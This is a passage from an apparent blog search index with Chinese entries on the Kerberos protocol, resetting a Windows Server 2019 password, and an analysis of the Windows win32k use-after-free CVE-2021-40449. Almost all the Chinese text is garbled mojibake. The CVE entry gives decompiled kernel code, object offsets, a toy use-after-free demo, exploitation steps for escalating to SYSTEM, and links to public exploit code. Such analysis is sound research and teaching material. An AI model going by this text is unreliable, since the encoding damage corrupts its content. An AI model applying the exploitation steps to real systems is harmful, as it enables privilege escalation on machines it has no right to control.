Keyï¼‰ï¼Œå°†Cæ¶ˆæ¯ï¼ˆTGTï¼‰å­˜å‚¨åœ¨æœ¬åœ°å‡­æ®ç¼“å­˜å†…ã€‚\nClientå‘TGSè¯·æ±‚STï¼ŒæœŸé—´éœ€è¦å‘TGSå‘é€ä¸¤æ¡æ¶ˆæ¯æ˜æ–‡\nDæ¶ˆæ¯å†…å®¹ æƒ³è¦è¯·æ±‚çš„æœåŠ¡IDå³SS ç”Ÿå‘½å‘¨æœŸ TGT Eæ¶ˆæ¯å†…å®¹ä½¿ç”¨TGSä¼šè¯å¯†é’¥ï¼ˆTGS Session Keyï¼‰åŠ å¯†å³èº«ä»½éªŒè¯å™¨ ç”¨æˆ·å æ—¶é—´æˆ³ TGSéªŒè¯Clientè¯·æ±‚æœåŠ¡æ˜¯å¦å­˜åœ¨ï¼Œå­˜åœ¨åˆ™è¿›å…¥ä¸‹ä¸€æ­¥ã€‚\nTGSæå–Dæ¶ˆæ¯å†…çš„TGTï¼Œç”¨TGSå¯†é’¥è§£å¯†ï¼ˆTGS Secret Keyï¼‰ï¼Œä»ä¸­æå–TGSä¼šè¯å¯†é’¥ï¼ˆTGS Session Keyï¼‰ï¼Œå†ç”¨TGSä¼šè¯å¯†é’¥è§£å¯†Eå¾—åˆ°ç”¨æˆ·åå’Œæ—¶é—´æˆ³ï¼Œç°åœ¨TGSå¾—åˆ°äº†ç”¨æˆ·åå’Œæ¶ˆæ¯Eçš„æ—¶é—´æˆ³ï¼Œä»¥åŠæ¶ˆæ¯Cçš„ç”¨æˆ·åå’Œæ—¶é—´æˆ³\næ¯”è¾ƒä¸¤ä¸ªç”¨æˆ·åå’Œæ—¶é—´æˆ³ æ£€æŸ¥TGTç”Ÿå‘½å‘¨æœŸæ˜¯å¦è¿‡æœŸ æ£€æŸ¥èº«ä»½éªŒè¯å™¨ï¼ˆEæ¶ˆæ¯ï¼‰æ˜¯å¦åœ¨ç¼“å­˜å†…(å­˜ç–‘) TGSç”ŸæˆéšæœºæœåŠ¡ä¼šè¯ï¼ˆservice session keyï¼‰å¯†é’¥ï¼Œå¹¶å‘é€ä¸¤æ¡æ¶ˆæ¯ç»™Client\nFæ¶ˆæ¯å†…å®¹ç”¨æœåŠ¡å¯†é’¥(Service Secret Key)åŠ å¯† ç”¨æˆ·å æœåŠ¡å æ—¶é—´æˆ³ ç½‘ç»œåœ°å€ ç”Ÿå‘½å‘¨æœŸ æœåŠ¡ä¼šè¯å¯†é’¥ Gæ¶ˆæ¯å†…å®¹ç”¨TGSä¼šè¯å¯†é’¥åŠ å¯† æœåŠ¡å æ—¶é—´æˆ³ ç”Ÿå‘½å‘¨æœŸ æœåŠ¡ä¼šè¯å¯†é’¥ å› ä¸ºClientæœ‰TGSä¼šè¯å¯†é’¥æ‰€ä»¥å¯ä»¥è§£å¯†æ¶ˆæ¯Gå¾—åˆ°æœåŠ¡ä¼šè¯å¯†é’¥ï¼ˆservice session keyï¼‰\nå®¢æˆ·ç«¯å’ŒSSè¿æ¥ï¼Œå‘é€ä¸¤æ¡æ¶ˆæ¯\næ¶ˆæ¯Hç”¨æœåŠ¡ä¼šè¯å¯†é’¥åŠ å¯†å†…å®¹èº«ä»½éªŒè¯å™¨ï¼š ç”¨æˆ·å æ—¶é—´æˆ³ æ¶ˆæ¯L å³æ¶ˆæ¯F SSæ”¶åˆ°è¯·æ±‚ï¼Œç”¨æœåŠ¡å¯†é’¥è§£å¯†æ¶ˆæ¯Iå³æ¶ˆæ¯Få¾—åˆ°æœåŠ¡ä¼šè¯å¯†é’¥åŠç”¨æˆ·åæ—¶é—´æˆ³ç­‰ä¿¡æ¯ï¼Œå†ç”¨æœåŠ¡ä¼šè¯å¯†é’¥è§£å¯†æ¶ˆæ¯Hå¾—åˆ°ç”¨æˆ·åå’Œæ—¶é—´æˆ³\nSSè¿›è¡Œèº«ä»½éªŒè¯\næ¯”è¾ƒæ¶ˆæ¯Hå†…ç”¨æˆ·åå’Œæ¶ˆæ¯Få†…çš„ç”¨æˆ·å æ¯”è¾ƒæ¶ˆæ¯Hå’Œæ¶ˆæ¯Få†…çš„æ˜¯æ—¶é—´æˆ³ æ£€æŸ¥æ¶ˆæ¯Få†…ç”Ÿå‘½å‘¨æœŸ æ£€æŸ¥èº«ä»½éªŒè¯å™¨æ˜¯å¦åœ¨ç¼“å­˜å†… SSå‘ClientéªŒè¯èº«ä»½ï¼Œå‘å…¶å‘é€æ¶ˆæ¯\næ¶ˆæ¯Jä½¿ç”¨æœåŠ¡ä¼šè¯å¯†é’¥åŠ å¯†èº«ä»½éªŒè¯å™¨ æœåŠ¡ID æ—¶é—´æˆ³ï¼ˆåœ¨æ¶ˆæ¯Hå†…çš„æ—¶é—´æˆ³ï¼‰ å®¢æˆ·ç«¯æ”¶åˆ°SSçš„èº«ä»½éªŒè¯å™¨æ¶ˆæ¯ï¼ˆJï¼‰ï¼Œä½¿ç”¨ç¼“å­˜å†…çš„æœåŠ¡ä¼šè¯å¯†é’¥è¿›è¡Œè§£å¯†å¾—åˆ°æœåŠ¡IDåŠæ—¶é—´æˆ³ï¼Œå¹¶éªŒè¯æ˜¯å¦æœ‰æ•ˆ\nå‚è€ƒé“¾æ¥\nhttps://www.vanimpe.eu/2017/05/26/kerberos-made-easy/ https://zh.wikipedia.org/wiki/Kerberos http://www.nosqlnotes.com/technotes/kerberos-protocol/ https://juejin.im/post/6844903955416219661\nç®€åŒ–æ¨¡å‹ Clientå‘ASå‘é€æ˜æ–‡æ¶ˆæ¯ï¼Œç”³è¯·è®¿é—®çš„æœåŠ¡ ASæ£€æŸ¥ç”¨æˆ·åæ˜¯å¦å­˜åœ¨æœ¬åœ°æ•°æ®åº“ä¸­ï¼Œå­˜åœ¨åˆ™è¿”å›ä¸¤æ¡æ¶ˆæ¯ Aï¼šClient/TGSä¼šè¯å¯†é’¥(Client/TGS Session Key)ç”¨äºClientå’ŒTGSé€šä¿¡ï¼Œé€šè¿‡ç”¨æˆ·å¯†é’¥åŠ å¯† Bï¼šTGTï¼ˆåŒ…å«Client/TGSä¼šè¯å¯†é’¥ã€ç”¨æˆ·ã€ç”¨æˆ·ç½‘ç»œåœ°å€ã€TGTæœ‰æ•ˆæœŸï¼‰ï¼Œé€šè¿‡TGSå¯†é’¥åŠ å¯† Clientæ”¶åˆ°æ¶ˆæ¯ABï¼Œç”¨è‡ªå·±çš„ç”¨æˆ·å¯†é’¥è§£å¯†æ¶ˆæ¯Aå¾—åˆ°å’ŒTGSé€šä¿¡çš„å¯†é’¥TGSä¼šè¯å¯†é’¥ Clientå‘TGSè¯·æ±‚æœåŠ¡ï¼Œå‘é€ä¸¤æ¡æ¶ˆæ¯ Cï¼šæ¶ˆæ¯Bå’Œç”³è¯·çš„æœåŠ¡IDï¼ˆæ˜æ–‡ï¼‰ Dï¼šè®¤è¯ç¬¦ï¼ˆåŒ…æ‹¬ç”¨æˆ·IDã€æ—¶é—´æˆ³ï¼‰é€šè¿‡(Client/TGS Session Key)åŠ å¯† TGSæ‹¿åˆ°æœåŠ¡IDæ£€æŸ¥æ˜¯å¦æœ‰è¯¥æœåŠ¡ï¼Œå¦‚æœæœ‰è¯¥æœåŠ¡åˆ™ç”¨TGSå¯†é’¥è§£å¯†æ¶ˆæ¯Bå¾—åˆ°(Client/TGS Session Key)å†ç”¨TGSä¼šè¯å¯†é’¥è§£å¯†æ¶ˆæ¯Då¾—åˆ°ç”¨æˆ·IDã€æ—¶é—´æˆ³ï¼Œä¸TGTå†…çš„ç”¨æˆ·IDå’Œæ—¶é—´æˆ³æ¯”å¯¹éªŒè¯æœ‰æ•ˆæ€§ã€‚ é€šè¿‡ä¹‹åTGSè¿”å›ä¸¤æ¡æ¶ˆæ¯ç»™Client Eï¼šSTï¼ˆSSä¼šè¯å¯†é’¥ã€ç”¨æˆ·IDã€ç”¨æˆ·ç½‘ç»œåœ°å€ã€æœ‰æ•ˆæœŸï¼‰é€šè¿‡SSå¯†é’¥åŠ å¯† Fï¼šSSä¼šè¯å¯†é’¥ï¼Œé€šè¿‡TGSä¼šè¯å¯†é’¥åŠ å¯† Clienté€šè¿‡TGSä¼šè¯å¯†é’¥è§£å¯†æ¶ˆæ¯Få¾—åˆ°SSä¼šè¯å¯†é’¥ Clientç»™SSå‘é€ä¸¤æ¡æ¶ˆæ¯ Gï¼šå³æ¶ˆæ¯E Hï¼šè®¤è¯ç¬¦ï¼ŒåŒ…å«ç”¨æˆ·IDï¼Œæ—¶é—´æˆ³ï¼Œé€šè¿‡SSä¼šè¯å¯†é’¥åŠ å¯† SSæ”¶åˆ°ä¸¤æ¡æ¶ˆæ¯ä¹‹åç”¨SSå¯†é’¥è§£å¯†æ¶ˆæ¯Gï¼ˆEï¼‰å¾—åˆ°SSä¼šè¯å¯†é’¥ï¼Œåœ¨é€šè¿‡ä¼šè¯å¯†é’¥è§£å¯†æ¶ˆæ¯Hå¾—åˆ°ç”¨æˆ·IDã€æ—¶é—´æˆ³ç­‰ä¿¡æ¯ï¼Œå¦‚æœå’Œæ¶ˆæ¯Gï¼ˆEï¼‰å†…çš„æ—¶é—´æˆ³å’Œç”¨æˆ·IDæ¯”å¯¹ï¼Œé€šè¿‡åˆ™è¿”å›æ¶ˆæ¯ç»™Client Iï¼šæ¶ˆæ¯Hå†…çš„æ—¶é—´æˆ³ï¼Œé€šè¿‡SSä¼šè¯å¯†é’¥åŠ å¯† Clientæ”¶åˆ°æ¶ˆæ¯ä¹‹åç”¨SSä¼šè¯å¯†é’¥è§£å¯†å¾—åˆ°æ—¶é—´æˆ³ï¼Œå¹¶éªŒè¯ï¼Œé€šè¿‡åˆ™å¯ä»¥å‘SSå‘é€è¯·æ±‚ã€‚ "},{"uri":"https://www.ch35tnut.site/zh-cn/others/how-to-reset-password-administrator-on-windows-server-2019/","title":"åœ¨Windows server 2019ä¸Šé‡ç½®å¯†ç ","tags":[],"description":"","content":"é‡ç½®windows server 2019çš„administratorå¯†ç  ä¹‹å‰åœ¨Vmwareä¸Šçš„Windows server 2019çš„Administratorå¯†ç å¿˜è®°äº†ï¼Œä½¿ç”¨ç½‘ä¸Šçš„æ–¹æ³•æ—¶æ‰¾ä¸åˆ°ç”¨PEå¯åŠ¨ç³»ç»Ÿçš„åŠæ³•ï¼Œæ— å¥ˆåªèƒ½ä½¿ç”¨å…¶ä»–åŠæ³•ã€‚å†™æ­¤æ–‡è®°å½•ä¸€ä¸‹ã€‚\nè®¾ç½®CD/DVD é¦–å…ˆåœ¨è™šæ‹Ÿæœº-è®¾ç½®çš„ç¡¬ä»¶é€‰é¡¹å¡ä¸‹é¢çš„CD/DVDè®¾ç½®ä¸ºä½¿ç”¨ISOæ˜ åƒæ–‡ä»¶å¹¶æ‰¾åˆ°windows server 2019é•œåƒä½ç½®ï¼Œå¦‚ä¸‹å›¾\nä¹‹åé€‰æ‹©è™šæ‹Ÿæœº-ç”µæº-å¼€æœºæ—¶æ‰“å¼€å›ºä»¶å¯åŠ¨è™šæ‹Ÿæœºï¼Œè™šæ‹Ÿæœºå°±ä¼šè¿›å…¥BIOSï¼Œåœ¨BIOSé‡Œé€‰æ‹©CD/DVDå¯åŠ¨ï¼Œå³ä¼šè¿›å…¥ä¸‹å›¾ã€‚\nå‚è€ƒé“¾æ¥\nhttps://www.osradar.com/how-to-reset-password-administrator-on-windows-server-2019/\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2021-40449-analyse/","title":"CVE-2021-40449 åˆ†æ","tags":[],"description":"","content":"CVE-2021-40449 Win32kææƒæ¼æ´åŠPOCåˆ†æ èƒŒæ™¯ CVE-2021-40449æ˜¯å¡å·´æ–¯åŸºå®éªŒå®¤åœ¨2021å¹´8æœˆä¸‹æ—¬åˆ°9æœˆä¸Šæ—¬åœ¨WindowsæœåŠ¡å™¨ä¸Šæ•è·çš„æ¶æ„æ ·æœ¬åˆ©ç”¨çš„ææƒæ¼æ´ï¼Œè¯¥æ¼æ´å­˜åœ¨äºwin32kfull.sysé©±åŠ¨å†…ï¼Œåˆ©ç”¨è¯¥æ¼æ´å¯ä»¥åœ¨windowsä¸­å®Œæˆä»usersåˆ°systemçš„æƒé™æå‡ã€‚\nåŸºæœ¬æ¦‚å¿µ å†…æ ¸å¯¹è±¡ï¼šå†…æ ¸å¯¹è±¡å³åœ¨å†…æ ¸ç©ºé—´å­˜åœ¨çš„å¯¹è±¡ï¼Œåªèƒ½ç”±å†…æ ¸åˆ†é…ï¼Œå†…æ ¸è®¿é—®ã€‚\nå†…æ ¸å¯¹è±¡çš„å¼•ç”¨è®¡æ•°ï¼šåœ¨æ“ä½œç³»ç»Ÿä¸­ï¼Œå¯èƒ½æœ‰å¤šä¸ªè¿›ç¨‹è®¿é—®åŒä¸€ä¸ªå†…æ ¸å¯¹è±¡ï¼Œå¦‚æœæ²¡æœ‰è¿›ç¨‹éœ€è¦ä½¿ç”¨è¯¥å¯¹è±¡å†…æ ¸å°±åº”è¯¥é‡Šæ”¾è¯¥å¯¹è±¡ï¼Œæ‰€ä»¥ä¸ºäº†å‡†ç¡®çš„é‡Šæ”¾è¯¥å¯¹è±¡å°±æœ‰äº†å¼•ç”¨è®¡æ•°ã€‚å½“å†…æ ¸å¯¹è±¡è¢«åˆ›å»ºæ—¶ï¼Œå¼•ç”¨è®¡æ•°è¢«æ ‡è®°ä¸º1ï¼Œè°ƒç”¨CloseHandle()æ—¶å†…æ ¸å¯¹è±¡çš„å¼•ç”¨è®¡æ•°å°±-1ï¼Œè¿™å¯ä»¥ç±»æ¯”Java GCçš„å¼•ç”¨è®¡æ•°æ³•ï¼š\nåœ¨å¯¹è±¡ä¸­æ·»åŠ ä¸€ä¸ªå¼•ç”¨è®¡æ•°å™¨ï¼Œæ¯å½“ä¸€ä¸ªåœ°æ–¹å¼•ç”¨å®ƒæ—¶ï¼Œè®¡æ•°å™¨å°±åŠ ä¸€ï¼›å½“å¼•ç”¨å¤±æ•ˆæ—¶ï¼Œè®¡æ•°å™¨å€¼å°±å‡ä¸€ï¼›ä»»ä½•æ—¶åˆ»è®¡æ•°å™¨ä¸ºé›¶çš„å¯¹è±¡å°±æ˜¯ä¸å¯èƒ½å†è¢«ä½¿ç”¨çš„ã€‚\nå¥æŸ„ï¼šç”±äºå†…æ ¸å¯¹è±¡åªèƒ½ç”±å†…æ ¸åˆ†é…ã€è®¿é—®ã€ä¿®æ”¹ï¼Œå½“ring 3å±‚çš„åº”ç”¨ç¨‹åºæƒ³è¦æ“ä½œè¿™äº›å†…æ ¸å¯¹è±¡çš„æ—¶å€™ï¼Œå¹¶ä¸èƒ½ç›´æ¥æ“æ§å†…æ ¸å¯¹è±¡ã€‚å½“å†…æ ¸å¯¹è±¡åˆ›å»ºå¥½åï¼Œæ“ä½œç³»ç»Ÿä¼šä½¿ç”¨ä¸€ä¸ªå¥æŸ„æ¥æ ‡è¯†è¯¥å¯¹è±¡å¹¶è¿”å›ç»™åº”ç”¨ç¨‹åºï¼Œåº”ç”¨ç¨‹åºé€šè¿‡æ“ä½œç³»ç»Ÿæä¾›çš„ring 3å±‚APIæ¥æ“ä½œå¥æŸ„ï¼Œring3å±‚APIç»è¿‡ç³»ç»Ÿè°ƒç”¨è¿›å…¥å†…æ ¸ã€‚åœ¨å†…æ ¸å¤„å¥æŸ„å¯¹åº”ç€å…·ä½“çš„å†…æ ¸å¯¹è±¡ï¼Œè¿™æ ·ring3å±‚çš„åº”ç”¨ç¨‹åºå°±å¯ä»¥é€šè¿‡æ“ä½œå¥æŸ„æ¥é—´æ¥æ“ä½œå†…æ ¸å¯¹è±¡ã€‚\nå¥æŸ„è¡¨ï¼šå½“ä¸€ä¸ªè¿›ç¨‹åˆå§‹åŒ–çš„æ—¶å€™ï¼Œç³»ç»Ÿä¼šç»™è¯¥è¿›ç¨‹åˆ†é…ä¸€ä¸ªå¥æŸ„è¡¨ï¼Œå½“è¿›ç¨‹åˆ›å»ºå†…æ ¸å¯¹è±¡çš„æ—¶å€™ï¼Œå†…æ ¸åˆ›å»ºå¯¹åº”å†…æ ¸å¯¹è±¡ï¼Œå¹¶éå†è¯¥è¿›ç¨‹çš„å¥æŸ„è¡¨ï¼Œåœ¨å¥æŸ„è¡¨çš„ç©ºé—²ä½ç½®è®¾ç½®å†…æ ¸å¯¹è±¡ã€å¯¹è±¡æŒ‡é’ˆç­‰ï¼Œå¹¶è·å–è¯¥ä½ç½®çš„ç´¢å¼•ï¼Œä½œä¸ºè¿›ç¨‹åˆ›å»ºå¯¹è±¡çš„å‡½æ•°çš„è¿”å›å€¼ï¼Œå³ä¸ºå¥æŸ„ã€‚\nhttps://www.cnblogs.com/MisterXu/p/10846918.html\nDCï¼šæ˜¯ä¸€ä¸ªå†…æ ¸å¯¹è±¡ï¼Œå…¨ç§°device contextï¼Œè®¾å¤‡ä¸Šä¸‹æ–‡å¯¹è±¡\nHDCï¼šDCå¯¹è±¡çš„å¥æŸ„ã€‚\né‡Šæ”¾åé‡ç”¨ï¼šæŒ‡ä¸€ä¸ªå†…å­˜ç©ºé—´è¢«æ“ä½œç³»ç»Ÿé‡Šæ”¾åï¼Œå†…å­˜ç©ºé—´å˜ä¸ºç©ºé—²çŠ¶æ€ï¼Œå¦‚æœç”¨æˆ·åœ¨è¿™ä¸€åˆ»ç”³è¯·å†…å­˜ï¼Œæ“ä½œç³»ç»Ÿä¼šä¼˜å…ˆåˆ†é…åˆšé‡Šæ”¾çš„å†…å­˜ï¼Œåˆ™ç”¨æˆ·å¤§æ¦‚ç‡å¯ä»¥ç”³è¯·åˆ°åˆšåˆšé‡Šæ”¾çš„å†…å­˜å¹¶ä¿®æ”¹è¯¥å†…å­˜ç©ºé—´çš„å†…å®¹ã€‚å¦‚æœåœ¨é‡Šæ”¾ç©ºé—´ä¹‹å‰æœ‰æŒ‡é’ˆæŒ‡å‘è¯¥ç©ºé—´ï¼Œåœ¨é‡Šæ”¾ç©ºé—´ä¹‹åæŒ‡é’ˆå¹¶æœªæŒ‰ç…§ç†æƒ³çŠ¶æ€ç½®ä¸ºNULLï¼Œç”±äºé‡Šæ”¾åå¯ä»¥é‡æ–°ç”³è¯·è¯¥å†…å­˜å¹¶ä¿®æ”¹å†…å­˜å†…å®¹ï¼Œåç»­å¦‚æœç»§ç»­ä½¿ç”¨è¯¥æŒ‡é’ˆï¼Œä½†å†…å­˜å†…å†…å®¹å¹¶ä¸æ˜¯é¢„æœŸçš„é‡Šæ”¾ä¹‹å‰çš„å†…å®¹ï¼Œåˆ™ä¼šäº§ç”Ÿéé¢„æœŸè¡Œä¸ºã€‚\negï¼š\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; void method(); void badMethod(); // å®šä¹‰å‡½æ•°æŒ‡é’ˆ typedef void (*function)(); class test { public: function p; test() { } }; int main() { // new testå¯¹è±¡ test *t = new test(); test *p = t; t-\u0026gt;p = method; p-\u0026gt;p(); // é‡Šæ”¾tæŒ‡å‘çš„testå¯¹è±¡çš„ç©ºé—´ delete t; test *pt; for (size_t i = 0; i \u0026lt; 10000; i++) { // å ç”¨åˆšé‡Šæ”¾çš„å¯¹è±¡çš„å†…å­˜ç©ºé—´ pt = (test *)malloc(sizeof(test)); // å°†ç”³è¯·çš„ç©ºé—´å½“ä½œtestå¯¹è±¡ï¼Œå¹¶å°†å¯¹è±¡çš„å‡½æ•°æŒ‡é’ˆè®¾ç½®ä¸ºæ¶æ„å‡½æ•°åœ°å€ pt-\u0026gt;p = badMethod; } // è¿™é‡ŒåŸæ„æƒ³è¦è°ƒç”¨methodå‡½æ•°ï¼Œä½†æ˜¯å®é™…è°ƒç”¨äº†badMethodå‡½æ•° printf(\u0026#34;ç¬¬äºŒæ¬¡è°ƒç”¨\\n\u0026#34;); p-\u0026gt;p(); return 0; } void method() { printf(\u0026#34;method\\n\u0026#34;); } void badMethod() { printf(\u0026#34;bad method\\n\u0026#34;); } æ¼æ´å½¢æˆåˆ†æ è¯¥æ¼æ´äº§ç”Ÿäºwin32kfull!GreResetDCInternalå‡½æ•°ä¸­ï¼Œè¯¥å‡½æ•°å†…ä¼šè·å–DCå¯¹è±¡å†…çš„å‡½æ•°æŒ‡é’ˆï¼Œå¹¶æ‰§è¡Œè¯¥å‡½æ•°æŒ‡é’ˆæŒ‡å‘çš„å‡½æ•°ï¼Œä½†å¹¶æœªæ£€æŸ¥DCå¯¹è±¡æ˜¯å¦å¼‚å¸¸ã€‚æ‰€ä»¥å¦‚æœå¯ä»¥åœ¨è°ƒç”¨å‡½æ•°æŒ‡é’ˆä¹‹å‰é‡Šæ”¾DCå¯¹è±¡ï¼Œå¹¶é‡æ–°ç”³è¯·è¯¥å¯¹è±¡çš„å†…å­˜ç©ºé—´ï¼Œé€šè¿‡æ„é€ å†…å­˜å¸ƒå±€ï¼Œä¿®æ”¹åŸDCå¯¹è±¡çš„å‡½æ•°æŒ‡é’ˆæŒ‡å‘å…¶ä»–ä»»æ„å†…æ ¸å‡½æ•°ï¼Œå°±å¯ä»¥åœ¨win32kfull!GreResetDCInternalå†…å®ç°ä»»æ„å†…æ ¸å‡½æ•°è°ƒç”¨ã€‚\næ ¹æ®ä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥ç®—å‡ºDCOå¯¹è±¡å’ŒDCå¯¹è±¡çš„å‡½æ•°æŒ‡é’ˆçš„å…³ç³»ï¼šfunction pointer=* (* (DCO +0x30)+0xad0)ï¼Œå…¶ä¸­DCO +0x30å³æŒ‡å‘DCå¯¹è±¡çš„æŒ‡é’ˆ\nv10 = *(_QWORD *)(v8 + 48);\nv15 *= * (void (_fastcall * * )(QWORD, _QWORD))(*v10 + 2768);\n__int64 __usercall GreResetDCInternal@\u0026lt;rax\u0026gt;(HDC a1@\u0026lt;rcx\u0026gt;, __int64 a2@\u0026lt;rdx\u0026gt;, int *a3@\u0026lt;r8\u0026gt;) { __int64 v24; // [rsp+50h] [rbp-20h] __int64 v25; // [rsp+60h] [rbp-10h] DCOBJ::DCOBJ((DCOBJ *)\u0026amp;v25, a1); // åˆ©ç”¨æ„é€ å‡½æ•°ä»HDCåˆ›å»ºDCOBJå¯¹è±¡ v8 = v25; Â·Â·Â·Â·Â·Â·Â·Â·Â·Â· v10 = *(_QWORD *)(v8 + 48);\t// èµ‹å€¼ *(_QWORD *)(v10 + 1736) = 0i64; v24 = v11; Â·Â·Â·Â·Â·Â·Â· v9 = *(_QWORD *)(v25 + 512) != 0i64; v12 = *(_DWORD *)(v25 + 120) \u0026gt; 0; Â·Â·Â·Â·Â·Â·Â· v13 = (HDC)hdcOpenDCW(\u0026amp;qword_1C0141EB0, v26, 0i64, 0i64, *(_QWORD *)(v10 + 2584));// åˆ›å»ºæ–°çš„DCå¯¹è±¡ï¼Œè¿”å›å¯¹åº”çš„HDCå¥æŸ„ if ( v13 ) { *(_QWORD *)(v10 + 2584) = 0i64; DCOBJ::DCOBJ((DCOBJ *)\u0026amp;v24, v13); v14 = (_QWORD *)v24; if ( v24 ) { if ( v12 ) *(_DWORD *)(v24 + 120) = *(_DWORD *)(v24 + 116); v14[308] = *(_QWORD *)(v25 + 2464); *(_QWORD *)(v25 + 2464) = 0i64; v14[309] = *(_QWORD *)(v25 + 2472); *(_QWORD *)(v25 + 2472) = 0i64; v15 = *(void (__fastcall **)(_QWORD, _QWORD))(v10 + 2768); if ( v15 ) v15(*(_QWORD *)(v10 + 1824), *(_QWORD *)(v14[6] + 1824i64));// è°ƒç”¨å‡½æ•°æŒ‡é’ˆæŒ‡å‘çš„å‡½æ•°ï¼Œä¼ å…¥å‚æ•°ä¸ºç”¨æˆ·ä¼ å…¥çš„HDCå¯¹åº”çš„DCå¯¹è±¡å†…çš„å€¼ Â·Â·Â·Â·Â·Â·Â· HmgSwapLockedHandleContents(v3, 0i64, v6, 0i64, v23);// äº¤æ¢æ—§çš„å’Œæ–°çš„HDCå¯¹è±¡ GreReleaseHmgrSemaphore(); Â·Â·Â·Â·Â·Â· bDeleteDCInternal(v6, 1i64, 0i64); // ä¼ å…¥äº†hdcOpenDCWè¿”å›çš„HDCï¼Œä½†HmgSwapLockedHandleContentsäº¤æ¢äº†æ–°æ—§å¥æŸ„å¯¹åº”çš„DCå¯¹è±¡ï¼Œæ­¤æ—¶v6å¥æŸ„å¯¹åº”æ—§DCå¯¹è±¡ã€‚ Â·Â·Â·Â·Â·Â· è°ƒç”¨è¯¥å‡½æ•°æŒ‡é’ˆçš„æ—¶å€™ï¼Œæ‰€ç”¨çš„ä¸¤ä¸ªå‚æ•°ä¹Ÿæ˜¯æºäºç”¨æˆ·ä¼ å…¥çš„HDCå¥æŸ„å¯¹åº”çš„DCå¯¹è±¡ã€‚\nv10 = *(_QWORD *)(v8 + 48);\t_\n_v14[308] = *(_QWORD *)(v25 + 2464);\nv14[309] = *(_QWORD *)(v25 + 2472);\nv15(*(_QWORD *)(v10 + 1824), *(_QWORD *)(v14[6] + 1824i64));\nåœ¨win32kfull!GreResetDCInternalå‡½æ•°çš„ååŠæ®µä¼šè°ƒç”¨win32kbase!DeleteDCInternalå‡½æ•°é‡Šæ”¾ä¼ å…¥è¯¥å‡½æ•°çš„HDCå¥æŸ„æ‰€å¯¹åº”çš„DCå¯¹è±¡ï¼Œåˆ°è¿™é‡Œå°±è¾¾æˆäº†use-after-freeçš„freeæ­¥éª¤ã€‚\nHDC v3; v3=a1; v13 = (HDC)hdcOpenDCW(\u0026amp;qword_1C0141EB0, v26, 0i64, 0i64, *(_QWORD *)(v10 + 2584));// åˆ›å»ºæ–°çš„HDC v6 = v13; if ( v13 ) { *(_QWORD *)(v10 + 2584) = 0i64; DCOBJ::DCOBJ((DCOBJ *)\u0026amp;v24, v13); v14 = (_QWORD *)v24; if ( v24 ) { if ( v12 ) *(_DWORD *)(v24 + 120) = *(_DWORD *)(v24 + 116); v14[308] = *(_QWORD *)(v25 + 2464); *(_QWORD *)(v25 + 2464) = 0i64; v14[309] = *(_QWORD *)(v25 + 2472); *(_QWORD *)(v25 + 2472) = 0i64; v15 = *(void (__fastcall **)(_QWORD, _QWORD))(v10 + 2768); if ( v15 ) v15(*(_QWORD *)(v10 + 1824), *(_QWORD *)(v14[6] + 1824i64)); GreAcquireHmgrSemaphore(); LOBYTE(v23) = 1; HmgSwapLockedHandleContents(v3, 0i64, v6, 0i64, v23);// äº¤æ¢æ—§çš„å’Œæ–°çš„HDCå¯¹è±¡ GreReleaseHmgrSemaphore(); Â·Â·Â·Â·Â·Â·Â· // åˆ é™¤HDCå¥æŸ„å¯¹åº”çš„DCå¯¹è±¡ã€‚ bDeleteDCInternal(v6, 1i64, 0i64); å¦‚æœåœ¨é‡Šæ”¾DCå¯¹è±¡ä¹‹åï¼Œé‡æ–°ç”³è¯·DCå¯¹è±¡ç©ºé—´ï¼Œä¿®æ”¹é‡Œé¢çš„å‡½æ•°æŒ‡é’ˆå†…å®¹ï¼Œå¹¶é€šè¿‡æŸäº›æ­¥éª¤ï¼Œè®©å†…æ ¸æ‰§è¡ŒDCå¯¹è±¡å†…çš„å‡½æ•°æŒ‡é’ˆï¼Œå³å¯è¾¾åˆ°useæ­¥éª¤è®©å†…æ ¸æ‰§è¡Œä»»æ„å†…æ ¸å‡½æ•°ã€‚\næ¼æ´åˆ©ç”¨åˆ†æ POC:\rhttps://github.com/KaLendsi/CVE-2021-40449-Exploit\nPOCä»£ç åˆ†æï¼š\rhttps://github.com/CppXL/cve-2021-40449-poc/blob/master/main.cpp\nè¦åˆ©ç”¨è¯¥æ¼æ´ï¼Œéš¾ç‚¹åœ¨äºfree DCå¯¹è±¡ä¹‹åæ€ä¹ˆä½¿å¾—å†…æ ¸å†æ¬¡è°ƒç”¨DCå¯¹è±¡çš„å‡½æ•°æŒ‡é’ˆï¼Œåœ¨æ­£å¸¸GreResetDCInternalå‡½æ•°æµç¨‹ä¸­ï¼Œæ˜¯å…ˆè°ƒç”¨DCå¯¹è±¡çš„å‡½æ•°æŒ‡é’ˆå†åˆ é™¤è¿™ä¸ªå¯¹è±¡ï¼Œå³æŒ‰ç…§æ­£å¸¸æµç¨‹å³ä¸ä¼šæœ‰use-after-freeçš„æ¡ä»¶ã€‚\nåœ¨ring 3å±‚è°ƒç”¨ResetDCå‡½æ•°ä¼šé€šè¿‡ç³»ç»Ÿè°ƒç”¨è¿›å…¥å†…æ ¸è°ƒç”¨å‡½æ•°NtGdiResetDCï¼Œåœ¨NtGdiResetDCä¼šè°ƒç”¨æ¼æ´å‡½æ•°GreResetDCInternalï¼Œåœ¨GreResetDCInternalä¸­ä¼šè°ƒç”¨DCå¯¹è±¡é‡Œé¢çš„å‡½æ•°æŒ‡é’ˆã€‚è¦åˆ©ç”¨è¯¥æ¼æ´å³è¦åœ¨è°ƒç”¨å‡½æ•°æŒ‡é’ˆä¹‹å‰å®Œæˆä¸‰æ­¥åŠ¨ä½œï¼š1ã€é‡Šæ”¾DCå¯¹è±¡2ã€é‡æ–°ç”³è¯·åŸDCå¯¹è±¡çš„å†…å­˜ç©ºé—´3ã€å®Œæˆå†…å­˜ç©ºé—´çš„å¸ƒå±€ã€‚\nåœ¨å‡½æ•°GreResetDCInternalè°ƒç”¨DCå¯¹è±¡çš„å‡½æ•°æŒ‡é’ˆä¹‹å‰ä¼šè°ƒç”¨win32kbase!hdcOpenDCWå‡½æ•°ã€‚win32kbase!hdcOpenDCWå‡½æ•°ä¼šæ‰§è¡Œæ‰“å°æœºé©±åŠ¨çš„ç”¨æˆ·æ€å›è°ƒå‡½æ•°è¡¨é‡Œé¢çš„å‡½æ•°ï¼Œè¯¥è¡¨é‡Œé¢å­˜æ”¾äº†å‡½æ•°æŒ‡é’ˆï¼Œè¯¥å‡½æ•°æŒ‡é’